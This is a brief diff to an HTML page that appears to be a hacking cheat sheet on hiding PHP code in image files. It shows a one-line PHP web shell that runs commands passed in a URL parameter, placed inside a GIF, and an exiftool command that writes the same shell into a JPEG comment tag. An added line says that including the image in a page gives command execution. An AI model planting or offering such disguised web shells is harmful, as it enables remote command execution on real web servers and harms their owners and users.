@@ -9,7 +9,8 @@ $ cat shell.gif <br/>
 ÿOÿ&lt;?php passthru($_GET[cmd]); ?&gt;<br/>
 <br/>
 <br/>
-or use the exif tool here to put code in tags<br/>
+or use exiftool to put code in tags<br/>
 <br/>
+exiftool -comment='&lt;?php passthru($_GET[cmd]); ?&gt;' image.jpg<br/>
 <br/>
-exiftool -comment='&lt;?php passthru($_GET[cmd]); ?&gt;' image.jpg</body></html>
+Include your image in the webpage and you have command exec!</body></html>
